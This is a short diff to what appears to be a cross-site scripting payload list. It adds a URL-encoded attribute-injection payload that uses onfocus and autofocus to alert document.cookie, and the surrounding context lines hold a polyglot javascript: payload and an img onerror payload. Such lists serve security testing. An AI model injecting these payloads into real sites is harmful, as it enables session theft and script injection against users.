@@ -58,6 +58,7 @@ alert(location.origin)
 ${alert}
 ────────────────────────────────────────────
 jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+'+onfocus%3D"alert(document.cookie)"+autofocus%3D""
 ────────────────────────────────────────────
 '),alert()//"><img src=x onerror=alert()>
 ────────────────────────────────────────────
